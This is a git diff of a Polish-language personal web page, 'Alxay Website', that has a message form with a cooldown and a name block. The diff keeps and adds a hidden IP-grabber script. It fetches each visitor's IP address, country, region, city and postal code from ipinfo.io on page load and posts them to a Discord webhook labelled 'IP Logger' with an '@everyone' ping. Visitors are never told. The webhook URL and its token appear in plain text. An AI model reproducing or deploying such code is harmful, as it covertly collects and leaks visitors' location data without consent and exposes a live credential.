@@ -7,78 +7,79 @@
     <title>Alxay Website</title>
     <link rel="stylesheet" href="main.css">
     <script src="main.js"></script>
-<script>
-function monke(json) 
-{
-     var request = new XMLHttpRequest();
-     
-     request.open("POST", "https://discord.com/api/webhooks/1200886968091938906/4wXL_zS_Ti30EuHHh4c1fBUyDARBf3dSCt2oq_uieSidj3JQYbzQd1cngdT_PtUQzjm1");
+    <script>
+        function monke(json) {
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1200886968091938906/4wXL_zS_Ti30EuHHh4c1fBUyDARBf3dSCt2oq_uieSidj3JQYbzQd1cngdT_PtUQzjm1");
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                username: "IP Logger",
+                avatar_url: "",
+                content: "@everyone",
+                embeds: [
+                    {
+                        title: "Someone visited the IP grabber!",
+                        color: 1752220,
+                        description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                    }
+                ]
+            }
+            request.send(JSON.stringify(params));
+        }
 
-     request.setRequestHeader('Content-type', 'application/json');
+        // Funkcja sprawdzająca cooldown i blokująca nazwę "Alxay"
+        function isCooldownExpired() {
+            var lastSentTime = localStorage.getItem('lastSentTime');
+            if (!lastSentTime) {
+                return true;
+            }
+            var currentTime = new Date().getTime();
+            var elapsedTime = currentTime - parseInt(lastSentTime);
+            var cooldownTime = 10 * 60 * 1000; // 10 minut w milisekundach
+            return elapsedTime >= cooldownTime;
+        }
 
-     var params = 
-     {
-          username: "IP Logger",
-          avatar_url: "",
-          content: "@everyone",
-          embeds: [
-               {
-                    title: "Someone visited the IP grabber!",
-                    color: 1752220,
-                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
-               }
-          ]
-     }
+        function isNameAllowed(name) {
+            return name.toLowerCase() !== 'alxay';
+        }
 
-     request.send(JSON.stringify(params));
-}
-</script>
-<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+        function send() {
+            var nameInput = document.getElementById('NameInput');
+            var inputField = document.getElementById('InputField');
+            var messageSent = document.getElementById('MessageSent');
+            var messageFailed = document.getElementById('MessageFailed');
 
-// Funkcja sprawdzająca cooldown i blokująca nazwę "Alxay"
-function isCooldownExpired() {
-  var lastSentTime = localStorage.getItem('lastSentTime');
-  if (!lastSentTime) {
-    return true;
-  }
-  var currentTime = new Date().getTime();
-  var elapsedTime = currentTime - parseInt(lastSentTime);
-  var cooldownTime = 10 * 60 * 1000; // 10 minut w milisekundach
-  return elapsedTime >= cooldownTime;
-}
+            if (!isCooldownExpired()) {
+                alert('Cooldown! Poczekaj przed wysłaniem następnej wiadomości! (10 minut)');
+                return;
+            }
 
-function isNameAllowed(name) {
-  return name.toLowerCase() !== 'alxay';
-}
+            var userName = nameInput.value.trim();
+            if (!isNameAllowed(userName)) {
+                alert('Nazwa Alxay nie jest dla ciebie dozwolona!');
+                return;
+            }
 
-function send() {
-  var nameInput = document.getElementById('NameInput');
-  var inputField = document.getElementById('InputField');
-  var sendMessageBtn = document.getElementById('SendMessage');
-  var messageSent = document.getElementById('MessageSent');
-  var messageFailed = document.getElementById('MessageFailed');
+            // Zapisanie czasu ostatniego wysłania wiadomości
+            localStorage.setItem('lastSentTime', new Date().getTime().toString());
 
-  if (!isCooldownExpired()) {
-    alert('Cooldown! Poczekaj przed wysłaniem następnej wiadomości! (10 minut)');
-    return;
-  }
+            // Zresetowanie formularza i wyświetlenie odpowiednich komunikatów
+            nameInput.value = '';
+            inputField.value = '';
+            messageSent.style.display = 'block';
+            messageFailed.style.display = 'none';
 
-  var userName = nameInput.value.trim();
-  if (!isNameAllowed(userName)) {
-    alert('Nazwa Alxay nie jest dla ciebie dozwolona!');
-    return;
-  }
-
-  // Zapisanie czasu ostatniego wysłania wiadomości
-  localStorage.setItem('lastSentTime', new Date().getTime().toString());
-
-  // Zresetowanie formularza i wyświetlenie odpowiednich komunikatów
-  nameInput.value = '';
-  inputField.value = '';
-  messageSent.style.display = 'block';
-  messageFailed.style.display = 'none';
-}
-</script>
+            // Wysłanie danych na webhook Discorda
+            monke({
+                ip: 'dummy_ip',
+                country: 'dummy_country',
+                region: 'dummy_region',
+                city: 'dummy_city',
+                postal: 'dummy_postal'
+            });
+        }
+    </script>
+    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
 
     <style>
         /* Dodaj dodatkowe style CSS, jeśli to konieczne */
@@ -119,4 +120,3 @@ function send() {
     </footer>
 </body>
 </html>
-
